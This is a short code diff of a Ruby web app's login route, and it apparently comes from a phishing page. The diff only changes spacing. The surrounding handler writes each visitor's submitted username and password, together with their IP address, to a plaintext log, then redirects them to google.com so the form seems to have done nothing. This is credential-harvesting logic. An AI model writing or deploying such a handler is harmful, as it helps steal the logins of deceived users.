@@ -48,7 +48,7 @@ post '/login' do
     username = params['UserName']
     password = params['Password']
     ip_addr  = @env['HTTP_X_REAL_IP']           # request.env['REMOTE_ADDR'].split(',').first
-    logger.info(username.to_s +':'+ password.to_s +':'+ ip_addr.to_s)
+    logger.info(username.to_s + ':' + password.to_s + ':' + ip_addr.to_s)
     redirect 'https://google.com'               # Redirect user to google After submitting the form
   else
     erb '/'.to_sym
